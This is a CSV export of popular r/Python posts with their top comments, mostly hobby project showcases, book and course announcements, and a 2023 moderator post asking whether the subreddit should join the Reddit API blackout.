Title,ID,Time,Body,TopComment
"Lad wrote a Python script to download Alexa voice recordings, he didn't expect this email.",g53lxf,2020-04-21 07:11:39,,"I’ll be honest, I was expecting a Cease and Desist from Amazon."
I redesign the Python logo to make it more modern,gftejm,2020-05-08 21:39:09,,Looks fantastic. I would vote for this redesign any day
"Just finished programming and building my own smart mirror in python, wrote all of the code myself and implemented my own voice control and facial recognition features",dmkx8a,2019-10-25 02:55:30,,"For some more context this is a project I have been working on for about 2 months around full time studies, mirror display is all made using the tkinter library and each frame has its own looping function to continuously update, has date, time, weather at my location, BBC news headlines, if Leicester city football club are playing it'll display the live score in the middle, if my face is detected my uni schedule displays, if my girlfriend's face is detected it logs in to her work website and fetches and displays her work timetable, calendar event system at the bottom continuously updated and loops through upcoming events, more events can be added through voice control, music can be streamed from YouTube with voice control, will tell you the output of flipping a coin through voice control and can do calculations through voice control. Total spend on hardware was about £150."
"I'm excited to share my first published book, Introduction to Python Programming for Business and Social Science Applications -- specifically geared towards students not specifically in computer science",irh8l0,2020-09-13 01:53:16,,"Okay two questions, where can I buy it
And will John Oliver sign it ?"
Drawing Mona Lisa with 256 circles using evolution [Github repo in comments],gn9add,2020-05-20 18:58:14,,"\[Github\] [https://github.com/ahmedkhalf/Circle-Evolution](https://github.com/ahmedkhalf/Circle-Evolution) 

Please note that this is a very early and undocumented version. I plan on adding color, and improving speed, then later putting it on PyPI. Push requests are appreciated :)"
I made a simulation using Python in which a neural network learns to race,hqc7ol,2020-07-13 17:27:37,,It would be great to show an animation example of how the trained model performs on an unseen track.
"Thanks to everyone’s advice, my mouse drawing algorithm has gotten much better and faster!",ghxqod,2020-05-12 06:14:39,,I hate to break it to you but that looks nothing like a mouse.
Just trying to create a orbit system in python and this happened...,dg0etx,2019-10-11 00:21:30,,When my code messes up I get error messages meanwhile you’re over here making art
Dev'ing an app to help visualize data from any matplotlib figure,gbko3e,2020-05-01 23:54:41,,Thats some iron man shit right there
I've designed brand new cheatsheets (x2) and handouts (x3) for matplotlib,hmoabi,2020-07-07 13:10:27,,Sources at https://github.com/matplotlib/cheatsheets
"I am a medical student, and I recently programmed an open-source eye-tracker for brain research",hpr28u,2020-07-12 16:29:10,,"To investigate how the brain uses visual information, I developed an open-source eye-tracker that runs well on consumer-grade hardware. I wrote this software in Python and aimed to design it modularly to encourage customisations. Feedback is welcome!

Here is the repo: [https://github.com/simonarvin/eyeloop](https://github.com/simonarvin/eyeloop)

This can be used to design closed-loop experiments in which the eyes affect the system, and the system affects the eyes. If interested in the neuro-scientific aspect, here's our preprint:

Preprint: [https://www.biorxiv.org/content/10.1101/2020.07.03.186387v1](https://www.biorxiv.org/content/10.1101/2020.07.03.186387v1)

Our lab:
http://www.yoneharalab.com"
"MS is considering official Python integration with Excel, and is asking for input",7jti46,2017-12-15 02:24:25,,"I think it is a really good idea.
Who uses VBA anyways? Or better: who likes to use VBA?

If i have a specific problem with VBA it is a hell of a mess to find the right resources to fix my problem.
With python, I just do a quick search and can find nearly limitless helpful resources.

So go python!"
I've made a 3D scanner that's fully automated using Python script on Android phone!,f55076,2020-02-17 15:12:31,,"All the source code and 3d model files are available on Thingiverse: [https://www.thingiverse.com/thing:4167615](https://www.thingiverse.com/thing:4167615)

The time-consuming photo taking process of the 3D scanner is automated using Arduino and Android script. The communication is carried on WiFi through a simple TCP channel.

This is an open source project. Suggestions are welcome!"
I made a little program that mutes spotify ads because i dont have the money to get premium . Not anything special but i think its quite neat. Any ideas on cool python projects i can build ?,ga7y7f,2020-04-29 19:46:06,,"""i don't have the money so i created a program to solve it""

that should be the anthem of every programer"
The only way to satisfy a programmer on his birthday!,hg9sk8,2020-06-26 23:34:38,,The indentation will make him cry again
Happy Holidays! Made a user-directed greeting card using Python Turtle Graphics,e9fgjp,2019-12-12 07:51:02,,Upvoted for the breaking window animation 😂
Python's response to MATLAB,cmdbuf,2019-08-06 00:38:00,,How would one convence their office that spending hundreds of thousands of dollars on matlab every year is ridiculous?
[Beginner’s Guide] How to start programming in Python,fr5561,2020-03-29 20:26:47,,Mouse coding. Next. Fucking. Level.
Python Cheet Sheet for begineers,7mwgtw,2017-12-30 03:34:05,,Could you post it in a higher resolution? It's pretty blurry.
A Python GUI for uninstalling the default Windows 10 apps.,gs7xdb,2020-05-28 23:06:43,,"[Github repo](https://github.com/Teraskull/PyDebloatX) (Reuploaded because previous was accidentally posted as link, not image)

I know there are a lot of similar apps already, but I wanted to make my own, plus it was intended to be used only by myself, as I reinstall Windows for friends often. But as it got more polished, I thought people might like it.

Edit: The PyDebloatX installer is now available on Github releases."
"A tool that copies a selected area of your screen, not as a picture, but as pastable text (GitHub in comments)",goldxf,2020-05-22 23:26:51,,"[Source Code](https://github.com/ianzhao05/textshot)

Not a particularly complex program, as the OCR backend uses Google's Tesseract engine, but I hope it can be useful!"
"Python project that answers high-school problems almost instantly. Made using Tesseract, Scrapy and Flask.",f35yg0,2020-02-13 14:47:33,,"This was a group project with a bunch of friends including u/jef-_- u/Wikileaks01 u/icosahedralcello

they deserve as much or even more credit than me."
Thought this looked familiar...,hu4umj,2020-07-20 02:01:40,,"Ah, the slushlenium package"
"PrettyErrors, a module to format exception reports",jui7zw,2020-11-15 15:36:29,,Why would I want that?? I love making my eyes bleed through unreadable lines trying to find what's wrong at rhe most stressful moment!
Finished a program that draws images with epicycles!,gvnyx5,2020-06-03 13:42:43,,Is the maths behind this related to Fourier analysis?
Python in a nutshell (Had to do it),hrvxrd,2020-07-16 04:57:02,,"Love this one, mainly because that's exactly how I explained it to a friend who I introduced to python. It's just objects, everything's an object, all the way down. It took a while, but he cooked the noodle, and made strides."
I wrote a Python program to play Google Dinosaur Game using Gesture Recognition,er9q4h,2020-01-20 15:05:04,,"Link to Github repository: 
https://github.com/Kshitij05/GestureRecognitionHackEd2020?files=1
(The final code is in ClenchRex.py)"
"I made an AI opponent for lesser known board game - Chain Reaction. Apparently, it plays better than me!",gjlcyp,2020-05-14 20:26:00,,Get the source code at: [https://github.com/shridharrhegde/chain-reaction-ai](https://github.com/shridharrhegde/chain-reaction-ai)
End-to-End Self Driving Car - Need For Speed,iwt09a,2020-09-21 11:52:04,,This gave me anxiety
My Professor wants hand written assignments. So I made MyhandWriting.. that can write in myway on a A4 sheet paper.,g5bbss,2020-04-21 16:16:44,,"Working for hours to save few minutes of unpleasant labor.


Totally my style."
So I made a Python and Arduino project that dynamically changes sets the ambient lighting to match the computed dominant color values from the wallpapers.,glzol8,2020-05-18 19:26:11,,This is really cool. I also love all of your wallpapers. Would making this work for something like every X frame of a video game work? Or would that fry the Arduino. I’m not very familiar with them.
"I am excited to share my 8th published book, Python 101, geared for beginners and intermediate level readers",isbjm4,2020-09-14 09:48:41,,"Since Reddit gave me this opportunity to do this personally, I would like to thank you for the many times you helped me (even without knowing it) to solve my bugs in python (and, of course, 80% were about wx). Your blog, book, and your stack overflow account have saved me from hours of debugging and trying to solve my daily problems.

Mike, thank you very much! I wish you a lot of success in your career and in your new book.

P.S: Hey Redditors, if you don't know this guy, I suggest you go to his website ([https://www.blog.pythonlibrary.org/](https://www.blog.pythonlibrary.org/)), for sure you will learn a lot about python."
This great message,j5a2ih,2020-10-05 08:47:07,,"I somehow repeatedly read Mark Hamill, and could not figure out how he fit that in between star wars, batman, and avatar..."
Should r/Python participate in the June 12th Blackout protesting the API changes,1434dxo,2023-06-07 13:29:21,"

""I didn't have time to write a short letter, so I wrote a long one instead.""

This is a long one, so I'm putting the TLDR up top:

# TLDR
A blackout has been proposed for June 12-14 to protest the API changes and extreme cost. 

The r/Python community seems very vocal about joining the blackout and I would like the r/Python community's input on this. Would you like to participate? How would you like to participate? 

If we do join the blackout, there are two different ways to participate which we need:
- Setting the subreddit to private (no engagement at all--including no ability to explain why our sub is private)
- Turning off submissions (the community and posts are still viewable, but no new comments or posts)

Please offer your feedback here, this isn't my decision alone to make.

# Background to the issue:
Reddit has been making changes. 

Ahead of their IPO, they're trying to get their ducks in a row, but in trying to maximize their value to potential shareholders, they're cutting off massive avenues of value to moderators and users. 
* Reddit, without warning, cut off [Pushshift's API access](https://www.reddit.com/r/modnews/comments/134tjpe/reddit_data_api_update_changes_to_pushshift_access/) (The stated reason is no response--but given their pricing structure for 3rd party mobile apps, and the time frame Reddit gave third party apps, any response by pushshift would have almost certainly resulted in this same action)
* Reddit is making a move to [remove API access to third party apps and developers](https://www.reddit.com/r/modnews/comments/13wshdp/api_update_continued_access_to_our_api_for/). It's no stretch that this move is motivated because after a number of years they're unable to compete in the mobile app space. So instead of 'git-ing gud' they're just shutting down competition. [Apollo App Response](https://www.reddit.com/r/apolloapp/comments/13ws4w3/had_a_call_with_reddit_to_discuss_pricing_bad/), [Rif Response](https://www.reddit.com/r/redditisfun/comments/13wxepd/rif_dev_here_reddits_api_changes_will_likely_kill/)
* They said RES will experience 'minimal' impact and old Reddit will be preserved. In the words of the Toolbox devs, ""[[they are not impacted.] Yet](https://www.reddit.com/r/toolbox/comments/141locs/announcement_reddits_upcoming_api_changes_and/jn0klpy/?context=10000) (Toolbox is a great tool for moderation because moderating with Reddit's site tools alone is a pain), and similarly [RES developers are not overly trusting](https://www.reddit.com/r/RESAnnouncements/comments/141hyv3/announcement_res_reddits_upcoming_api_changes/). Similarly, the [API once was safe](https://www.reddit.com/r/ModCoord/comments/142jwv3/oh_really_spez/jn5f0of/)
* [Reddit has laid off 5% of their staff](https://www.reuters.com/technology/reddit-lay-off-about-5-workforce-wsj-2023-06-06/)

The above actions are presented with bias--because frankly I am biased and Reddit is presenting their reasoning with bias so please take both sides' explanations with a grain of salt. Or Crait's worth of salt. But I feel they are presented accurately enough for this post's purpose. 

# Why we care about these changes:
## As a Moderator
There are a number of issues that a moderator has to deal with. 

First and foremost, I volunteer to do this. Moderation can be a drain on my energy, and is a time sink. Losing efficiencies reduce my ability to moderate, and Reddit Inc is laughably behind. 

* Reporting content as a moderator for admin review is an absolute pain, often a black box, there's at least three separate ways to report something instead of one consolidated form or three ways with parity across all three. The mechanisms have some overlap too. It's bad. 
* Often the admin response is subpar. As a mod I get that, my responses are subpar as well, and often times purposefully subpar because you need to make a decision on some content and there's just only so much to go off of. But it's for the extreme cases that the subpar response becomes a problem, like when there's a clear botnet falsifying engagement, and I've highlighted 10 accounts in it, and highlighted the way to flag them, and only two of those get tagged as ""actioned for ban evasion"" and the other 8 are free to keep on posting. Identifying a botnet should be easy on the Reddit side, it's exhausting on mine. One of the ways to help flag this is groups like Pushshift, and loosing that means I either knowingly allow manipulation or I give up more volunteer time hunting manipulation down. (By the way the specific one I am being vague about was brought to my attention thanks to a user's report. If they didn't flag it I probably would have missed that botnet, small though it was, so I really appreciate those comments and reports).
* I cannot trust the admins. This isn't combative in nature, but it's because we have different goals. Often times they align, but sometimes our goals are at odds of each other. My goal is to try to make sure the communities I moderate are best able to thrive, and Reddit Inc's goals are to drive engagement and ad revenue. Usually, like when we get to do something fun like a great AMA, we get great community events and Reddit gets engagement and clicks. But long term, Reddit will always follow profit. 

So these changes impact my workflow, and avenues to review and moderate content. And these are issues impacting our community. /r/Python is a great sub and great community. Compared to a lot of other subreddit we have relatively few issues. 

Communities which are identity, political, or news in nature have to deal with so much more. There's a ton to manage, there's a ton of filtering for mental health and safety that is needed too. Reddit is getting there when it comes to a lot of features, but their implementation is slow. It's getting measurably faster as they restructure, but they're still catching up to third party apps. 



## As a reddit user/Python developer
APIs are important. They're a wonderful gateway to programming, they help webpages serve information in a more lightweight fashion when webscraping would be costly (if you just need an upvote count, it's smarter to just make a call for than, then making a call for every asset a webpage renders. This gets a user what they need and isn't a burden on the site they're engaging with). APIs as a result both act as a great learning mechanism and as a way to keep from burdening the site as a whole.

No third party apps as alternatives makes it easier for Reddit to harvest data without pushback. And it makes it harder for users to customize their experience. This can be exceptionally important when it comes to communities which cater to important segments of the population, but segments which are so small that a profit focused organization would otherwise ignore. 

One of the more notable communities that these changes strongly impact is /r/blind, and there's an [explanation of these changes and their impact here](https://www.reddit.com/r/Blind/comments/13zr8h2/reddits_recently_announced_api_changes_and_the/). It's very probable that these issues will be quickly addressed now that they're in the public eye. But the underlying reality is that third party apps had been able to cater to users and communities and the Reddit app, with Reddit's stewardship, has failed to address accessibility at this level. 



# The Blackout
On June 12th a [blackout has been purposed](https://www.reddit.com/r/Save3rdPartyApps/comments/13yh0jf/dont_let_reddit_kill_3rd_party_apps/). 

[Many communities are praticipating](https://www.reddit.com/r/ModCoord/comments/1401qw5/incomplete_and_growing_list_of_participating/), and as this post points out we're curious if we should join. The blackout is either to cover a two day span, or last until demands are appropriately addressed. (this distinction is on a community basis, and will probably depend on how reddit responds)

There are different ways to perform it, either set the sub to private or lock the sub so no submissions can go through. Setting the sub to private prevents all engagement in the sub, but also means that presenting a message to users about what is going on isn't possible. 

I think it makes sense to keep the sub up and visible but to freeze it so no new posts or comments go through, but I'd like to hear your thoughts. 

# The Admins Response to the blackout
[Here is their reply](https://www.reddit.com/r/modnews/comments/141oqn8/api_updates_questions/)


A rough TLDR (I'm omitting the NSFW changes because... They're not clear to me. Maybe that's my shortfall but I think they're very vague about those)
1) Reddit isn't changing their position at all. They're digging in their heels and 'clarifying' what they're doing. No decision is reversed. 
2) bots using api for mod tools will be safe--if they break ""[Reddit] will work with you to fix them. "" 
3) launching at future dates: mod features 

___
On 2)--they basically told Apollo app to, ""Figure it out themselves""  https://www.reddit.com/r/redditdev/comments/13wsiks/api_update_enterprise_level_tier_for_large_scale/jmolrhn/?context=3
so forgive me if I don't find goodwill in that message. 

On 3) So many of those updates exist already in third party apps. So many of them are only getting attention this long into the Reddit app's lifespan because mods are making a stink about not moderating through the Reddit app. So especially for the rollout date of Sept. portions--I don't really believe it'll be executed well. And I don't want the mobile app on my phone. It's big, slow, and harvests a lot of data. 

And when that post went live Reddit was breaking again. 

https://www.redditstatus.com/

Not really something that exudes confidence in their ability to make good product decisions.

Now being fair here, there absolutely has been a [focus on improving modtools](https://www.reddit.com/r/reddit/comments/107orxe/ringing_in_2023_with_a_2022_reflection_on_mod/) over this past year, but they're still wildly behind. It's.. uncomfortable to trust a site when they cut off the alternatives for profit. Once there's no competition there's no longer a reason to loose revenue on further developing these resources. 

We were a part of the Reddit Talk platform development, and the admins we got to work with were lovely, and worked hard to greenlight the features moderators requested. A lot of those features were fleshing out the API so we could handle a Reddit Talk session in our workflows. 

But after a while [they shutdown Reddit Talk](https://www.reddit.com/r/RedditTalk/comments/11m4ijn/sunsetting_reddit_talk/) and that makes it difficult to trust long term product commitments from Reddit. Even if we get great admins who listen to feedback rolling out a product--they're not ultimately the ones who make the calls for the future. 

The admin response to the threat of a blackout reaffirms their changes and makes a lot of future promises for moderation tools. They sound good but at best those features should have been here ages ago, and their presentation betrays a lack of focus or care for moderation tools until recently. That recent change is affirming to see, but looking at Reddit's track record it might just be a passing phase until the public eye is off of the company. 


# What does this mean to /r/Python
That is mostly my question to you.

There are some defined things:

- If we blackout, the sub turns off. No one can post or comment for a while, and we hope our added voice helps encourage Reddit to continue to allow third party apps.
- If we don't join the blackout, we can still hope but there's less weight behind it. 

We don't normally join in on Reddit's protests. So this would be a new thing for our community--is this cause worth the loss in a few days of posts?

There is a [post by another user asking this question](https://old.reddit.com/r/Python/comments/1424s7m/going_dark_on_12th_june/) and at present it is the second most upvoted submission in the past year. So there has been a lot of great talk already, but I need to ask this question here as well to be sure I'm listening to the community as a whole. 

**Should /r/Python join the June 12th Blackout?** 

If we do, should we completely go private, or should we prevent the commenting or posting in our community during that period so an explanation of what is going on is viewable?

Please give your feedback, I'm reading through both this and the original submission to keep an eye on things. Remember though, be respectful. We're a Python focused community, so in addition to the rules here in the sub, I hope you'll adhere to the [PSF Code of Conduct](https://www.python.org/psf/conduct/). Be respectful to one another. Disagree with opinions, but be respectful of people. 

And now for [something completely different](https://www.reddit.com/user/iamkindofcreative/m/a_green_space/)","100%

In fact, why leave it at 2 days, do as many others are doing and go dark until they change their minds."
Made an annoying Python script that sends a friend on Facebook Messenger the Shrek movie word by word,gaqe3d,2020-04-30 14:23:00,,"Your friend doesn't seem to be really excited about the outcome, which leads to my question: what did motivate you to write this script? I mean, did you make it just for learning purposes, as a middleware for a bigger app, just for fun...?"
The Python Mega Course is now free on Udemy,yyi6xv,2022-11-18 19:48:22,"As some of you know, *The Python Mega Course: Build 10 Real World Applications* is one of the top courses on Udemy. I remade the course this year and now the course uses Python 3.11.

Today, I am now giving the previous version of the course to you for free. Please note that everything still works in the old version, and you are taking the same content taken by other 200k students in the past. It's just that we use Python versions before 3.10 in the videos.

Udemy link to get the course for free:

[https://udemy.com/course/former-python-mega-course-build-10-real-world-applications/](https://udemy.com/course/former-python-mega-course-build-10-real-world-applications/)

Password to enroll: *mega\_course*

Enjoy!

**Edit**: Wow, 2.5k upvotes! Thank you so much! If anyone wants the new Udemy (paid) version of the course as well, you can get a good discount here: [https://pythonhow.com/python-paid-course/the-python-mega-course/](https://pythonhow.com/python-paid-course/the-python-mega-course/)","Ardit!!!

Dude, this was the first programming course I bought and went through. It taught me enough to automate away a bunch of busy work at my job. 

The stuff I wrote after going through that course saved me hours a week, and convinced my boss to approve tuition reimbursement for me to do an online post-bacc in Computer science. 

Thank you for making this course! I'm in a good place that started right there."
I'm developing a game with Python and Pygame!,ggt5ld,2020-05-10 10:31:23,,The way that water moves... that’s slick.
I made an Instagram Bot to make DeepFakes for everyone! @deepfake.maker,izspe0,2020-09-26 05:42:11,,"Nice project, but people just be wary about the video and images you choose to send to a bot hosted who knows where by someone you don't know, specially when the bot anticipates being banned :)"
I finished my Python Ray Tracer capable of rendering refraction and thin film interference!,i9q4dx,2020-08-15 01:20:14,,"Source code:  [https://github.com/rafael-fuente/Python-Raytracer](https://github.com/rafael-fuente/Python-Raytracer)

This was a fun project made in my spare time. (it took me two months to finish it)

Some of the features implemented are refraction, thin film interference, textures, camera lens ,path tracing and animations.

The animation was done rendering frame by frame. Each frame take a few seconds to render in a fast computer.

Every question, critic, improvement about the source code is welcome and grateful!

Full resolution animations:  [https://www.youtube.com/watch?v=vt9vAcZQT4A](https://www.youtube.com/watch?v=vt9vAcZQT4A)"
Made a Screen Dimmer based on Facial Recognition with OpenCV and AppleScript!,h9bfe4,2020-06-15 15:34:55,,"does this positively impact battery life ? 

cool script !"
"A Program that acts as an ""invisibility cloak""... It camouflages any person/object that appears in front of the camera.... Sorry for the colour jittering🙈",hnknw0,2020-07-09 00:53:43,,"https://www.reddit.com/r/interestingasfuck/comments/hnhgfx/this_girl_made_an_invisible_cloak_using_python/?utm_medium=android_app&utm_source=share

What are the odds that I see two people doing the exact same project on the same day!

Nonetheless, good job OP!"
"We started late, but we managed to leave Python footprint on r/place!",63dkmq,2017-04-04 19:40:55,,slowclap.py
hashtags,e2234a,2019-11-27 02:26:29,,\# is not a hashtag.
Got my first job as a developer!,hv2vds,2020-07-21 15:10:10,"Finally!

After 9 months of purely studying and nothing else. Started from absolute 0 and landed my first job in Data Science on a marketing company.

Have to say it was very hard since I know no developers at all and had no one to ask from help.

Still feels weird and definitely have a stromg case of imposter syndrome but after writing my forst lines of code it does feel much better!

Sorry for the useless trivia but like I said,have no dev friends so I had to share the excitement somewhere :D","Brief roadmap since many comments asked for it.

I started by buying 2 courses on Udemy, both by Jose Portilla to whom I basically owe my life now.

I completed the Bootcamp first which basically teaches you syntax and the basics of Python. It also skims through most advanced topics.

Right after completing it I read Automate the Boring Stuff which I consider a must for any beginner python beginner.

After that I went on to completing some Katas on codewars.com and started working on my own projects which involved scraping data and using it to perform calculations. Building projects taught me way more than any course ever did. I had to work with pandas, numpy, itertools and many other libraries which I didn't even know existed at that point.

When I felt stuck at my project I started reading Dan Bader's Python Tricks book. It made me understand that courses are only the first step to learning and that you havw to read books to actually understand a language in depth.

I then continued with the Data Science course on Udemy and kept working on my project. I implemented 2 machine learning models which were very efficent in predicting the data I had.

Last step was sending my CV on very remote corner of the industry and failing 10 straight interviews (and losing one due to the pandemic).

I as lucky since I landed a job on a company which didn't require experience as much as it valued passion for learning and programming (they still thoroughly checked my projects though)


Most important thing is having the will to quit TV shows, games, movies and whatnot.

Goodluck to everyone!"
Recursively flipping and rotating an image. Python source code in comments!,j3hq21,2020-10-02 05:28:14,,"Source code here: [github.com/rvizzz/rotate](https://github.com/rvizzz/rotate)

[Fun application of syncing this animation with music!](https://twitter.com/r_vizzz/status/1311425342310092800?s=20)"
I released the Code for the Instagram DeepFake Bot!,j2ai2r,2020-09-30 07:12:54,,"Coincidentally, that anchor (Jan Hofer) just announced his retirement, but with this project, we can simply replace him."
I made a ray tracer that simulates curved spacetime by using Einstein's field equations from general relativity. Here's a black hole!,hb108j,2020-06-18 05:51:40,,"And here I am, just trying to get a margin on my image without it fucking with my border radius..."
Replicating Face Mask Detection - OpenCV and MobileNetV2,h7qjw7,2020-06-13 02:44:40,,ngl I looked at this for like 3 mins wondering when the gif would end...
I think it’s clear why I chose a Software Engineering career path instead of being an Artist,jltffk,2020-11-01 08:37:19,,I just realized the python logo are two pythons wtffff
Trying to keep my Jump Rope and AI Skills on point! Made this application using OpenPose. Link to the Medium tutorial and the GitHub Repo in the thread.,j02ftz,2020-09-26 16:32:29,,Thanks for sharing. Need this kinda article for my ongoing project.
"I teach Python courses - here's my collection of about 1,000 slides on various Python topics, including data science (hosted on GitHub, licensed under CC-BY-SA)",jii8ex,2020-10-27 00:55:24,,"Thank you so so much for sharing man, people like you are why the internet has become a powerful and free resource for endless resources and learning. Ima throw you a reward for this ☺"
"Because of quarantine and online clases I made some scripts to automatically connect to my zoom classes to get more sleep, I also configured my Mac to show old recording of me as a virtual cam in zoom so I don't have to attend early classes",fna798,2020-03-23 08:07:20,,"By the time quarantine is up, you'll have developed a robot to take classes for you so you'll never have to go again!

Do they actually make students turn on their webcam or could you join audio only?"
My python image/GIF glitching library is now on pypi!,f7taiy,2020-02-22 22:35:57,,"Very cool! Instead of requiring users to choose to download a separate file to use the CLI or install through PyPI, you should add an `entry_point` to your setup.py. This will make it so that when they install your package from PyPI it will automatically include a command line callable (like `glitch_this`) which they can invoke directly. Then users get both the library and CLI at once. More info on how to do that [can be found here](https://python-packaging.readthedocs.io/en/latest/command-line-scripts.html#the-console-scripts-entry-point)."
"Python Section at Foyle's, London",6no8fm,2017-07-17 03:50:44,,"Wow, never seen so many python books together outside my shelves. I'd be bankrupt if I lived near bookstore that stocked a decent amount of programming books."
I made a Spotify ad stopper because I was too poor for Premium. It automatically detects when an ad plays and then restarts Spotify in the background. It's my first project after escaping tutorial hell and I'd love any feedback you guys have!,in1pyu,2020-09-05 22:09:56,"It detects when an advertisement plays by monitoring the type of what track is currently playing, using the Spotipy api. It then closes and opens Spotify by the os module and plays it via pynput.

There have been a few programs in this subreddit which offer a similar functionality but mute spotify, and play another locally-stored song. I preferred not using that method and hence did this.

The code is present below, and is also present in my github repo [here](https://github.com/SakDev/SpotiByeBye).

Once again, I truly would appreciate any constructive feedback!

https://preview.redd.it/prkuja5q6cl51.png?width=4560&format=png&auto=webp&s=36f824adc24665e71d497aeb7e8afde5b1f2e9f7

**Edit**: Thank you so much for your positive response!!!! I've added a readme file to help anyone understand the gist of setting up the Spotify API to get your Client ID and secret.

~~And to all the people who claim this is stealing, I just wanted to say that while it does test ethical bounds, this program merely restarts Spotify using legally-obtained data from Spotify.~~

While this project has been an immensely rewarding learning experience, u/rtphokie kindly provided [reasons](https://www.reddit.com/r/Python/comments/in1pyu/i_made_a_spotify_ad_stopper_because_i_was_too/g45jgkd?utm_source=share&utm_medium=web2x&context=3) as to why this *could* possibly violate copyright laws. Hence I recommend one to utilize the code solely for learning purposes.","Looks great dude, the concept is very simple at least. Ill test it out when i get home."
"I was tired of opening 100s of tabs for internship apps. So, I made an app to scrape and apply to every single job listing on Glassdoor with one click using Selenium! (source code and YT video linked below)",gpaegj,2020-05-24 02:55:47,,"Nice, but I imagine that one of Glassdoor's devs is going to have ""added a reCAPTCHA to the job application form"" on their resume pretty soon."
Change text in place with custom hotkeys (Python Keyboard Listener),fbavjd,2020-02-29 18:44:39,,That last one seems the most useful. Changing caps is already a feature in any good editor.
Found this on twitter,d23ibi,2019-09-10 14:01:54,,I feel like crying everyday because my company's still using 2.7..
Randomly Generate 69420 - Generate random 5-digit numbers until 69420 is generated,hvq628,2020-07-22 16:38:44,,Forty thousand years of evolution and we've barely even tapped the vastness of human potential.
Fourier Series Visualizer in pygame.,ghab3o,2020-05-11 05:45:26,,"

I know pygame isn't a great choice to visualize maths but I'm yet to learn animation using other libraries such as matplotlib. 

The 3b1b and Destin's videos on Fourier Visualizations were the fuel."
Hexapod Robot Simulator with only Numpy and Plotly Dash,g2njfz,2020-04-17 05:00:31,,"Here’s the repo

https://github.com/mithi/hexapod-robot-simulator

it would be really cool if  a person or two could spend a couple of seconds to check it out (and maybe look at the issues as well) 

Thanks again!"
How to quickly remove duplicates from a list?,jfx7wy,2020-10-22 18:37:23,,"Good points!

Try to avoid posting code as images - it's bad when it comes to accessibility (bad eyesight, etc.), it's bad when it comes to copyability (although it's nice that we're able to emulate the 80s of typing in code from magazines) and it doesn't really work for searching."
Why would you want to use BeautifulSoup instead of Selenium?,ndozrt,2021-05-16 22:03:14,"I was wondering if there is a scenario where you would actually need BeautifulSoup. IMHO you can do with Selenium as much and even more than with BS, and Selenium is easier, at least for me. But if people use it there must be a reason, right?","BeautifulSoup is faster and uses less memory than Selenium. It doesn't execute JavaScript, or do anything other than parse HTML and work with its DOM.

If you're just using it for test automation then the only reason to use anything but Selenium is if you need to for performance reasons (e.g, you're running volume tests, and Selenium won't scale that far). If you're web scraping for some other reason, then just use what works for you. If you need a HTML parser because you need to work with HTML programmatically (maybe you're generating HTML, or you're working with HTML-based templates, or you're handling rich text), then use BeautifulSoup."
I created a python script to generate color palettes from images (info + github link in comments),dmzs6s,2019-10-26 00:21:00,,"Github repo: https://github.com/rodartha/ColorPalette/

So I designed this because I wanted to do an in-depth color study on some of my favorite directors. I would love to hear suggestions for improvements and additions. I’m also more than game to answer any questions people have on how it works.

Edit: huge thanks for my first gold ever!"
Microsoft Considers Adding Python As an Official Scripting Language in Excel,7kcjeq,2017-12-17 15:10:30,,Anything that gets us away from the god forsaken vba
"PrettyErrors, a module to format exception reports",qxeyrn,2021-11-19 20:14:06,,"Removing full paths can sometimes be a hindrance. In your example it doesn't really matter since it's just the VSCode Python extension. In other cases, knowing which non-user code is involved may be important to understanding the error. The file name alone does not make that clear.

It's good that this is configurable. Is showing paths not the default though? I think it should be."
I created a series in Python that takes you through every detail step-by-step (code included) on how to create your own algorithmic trading bot that trades the financial and crypto markets for free.,ld81ic,2021-02-05 22:18:05,"# How to create an algorithmic trading bot with Python

&#x200B;

1. [Overview](https://www.conorjohanlon.com/overview/) \- An overview of the project.
2. [Design](https://www.conorjohanlon.com/lets-design-part-1/) \- Requirements and how the trader operates.
3. [Getting financial data into Python](https://www.conorjohanlon.com/getting-data-from-mt5-to-python/) \- Pulling financial data into Python from MetaTrader5.
4. [Open a trade using the MT5 API with Python](https://conorjohanlon.com/how-to-open-a-trade-in-mt5-with-python/) \- How to open a trade programmatically via MetaTrader 5.
5. [Close a trade with MT5 using Python](https://www.conorjohanlon.com/close-a-trade-with-mt5-using-python/) \- How to close an open trade with MetaTrader 5.
6. [Creating an algotrader/trading bot with Python – Part 1](https://www.conorjohanlon.com/creating-an-algotrader-trading-bot-with-python-part-1/) \- Creating the trading bot loop and opening trades with an entry strategy.
7. [Creating an algotrader/trading bot with Python – Part 2](https://conorjohanlon.com/creating-an-algotrader-trading-bot-with-python-part-2/) \- Implementing a strategy reader.
8. [Creating an algotrader/trading bot with Python – Part 3](https://www.conorjohanlon.com/creating-an-algotrader-trading-bot-with-python-part-3/) \- Closing a trade with an exit strategy.
9. [Creating a strategy for your algorithmic trading bot – Part 1](https://www.conorjohanlon.com/creating-a-strategy-for-your-algorithmic-trading-bot-part-1/) \- Creating a dynamic strategy with JSON for trading part 1.
10. [Creating a strategy for your algorithmic trading bot – Part 2](https://www.conorjohanlon.com/creating-a-strategy-for-your-algorithmic-trading-bot-part-2/) \- Creating a dynamic strategy with JSON for trading part 2.
11. [Dynamically calculate lot size for your algorithmic trading bot](https://www.conorjohanlon.com/dynamically-calculate-the-lot-size-your-algorithmic-trading-bot/) \- Dynamically calculate your position size based on account size and risk.
12. [Send messages from Python to Slack](https://www.conorjohanlon.com/sending-alerts-from-python-via-slack/) \- Sending open trade/close trade alerts to slack.
13. [Send an email from Python](https://www.conorjohanlon.com/send-an-email-from-python/) \- Sending open trade/close trade alerts via email.
14. [Trade management for the ](https://www.conorjohanlon.com/trade-management-for-algorithmic-trading-bot/)[algorithmic trading bot](https://www.conorjohanlon.com/trade-management-for-algorithmic-trading-bot/) \- How to manage your trades and limiting your risk.

*Disclaimer: Trading financial markets involves risk, and is not suitable for all investors. I am not responsible for any losses incurred due to your trading or anything else. I do not recommend any specific trade or action, and any trades you decide to take are your own.*  


**EDIT: I just want to say a huge thank you for the overwhelming support everyone in this community has given to me. I will be continuing this series diving into more advanced topics and eventually will share how I created a UI for the bot and also for back testing.**","Great organization to all of this!  For future additions, it would be great to add back testing to this series.  

Just a heads up to anyone who is new to trading and looking to trade with algorithms (or any strategy for that matter), you should back test everything, or paper trade before actually setting something to go live.  Building a bot does not guarantee profits!  The market can be extremely unpredictable but with the right strategy and loss risk mitigation, it can be an interesting dive."
A Command Line Stock Dashboard,hx9q9p,2020-07-25 04:45:33,,"Hey r/python friends!

I created a simple command line dashboard for monitoring stocks and wanted to share it.

I was looking for something like the Apple stock app that was cross-platform and can run from the terminal or command prompt. I couldn't find anything like that so I decided to write my own Python package :)

